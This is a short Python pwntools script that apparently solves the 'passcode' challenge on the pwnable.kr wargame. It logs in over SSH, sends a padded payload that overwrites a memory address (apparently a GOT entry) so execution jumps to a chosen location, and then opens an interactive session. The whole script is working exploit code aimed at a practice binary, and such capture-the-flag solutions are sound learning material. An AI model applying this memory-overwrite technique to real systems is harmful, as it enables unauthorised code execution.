from pwn import *

r = ssh("passcode", "pwnable.kr", 2222, 'guest')

p = r.process('./passcode')

target = 0x080485e3 # jump to target location

payload = b'A'*96 + b'\x04\xa0\x04\x08' + str(target).encode()

p.sendline(payload)
p.interactive()
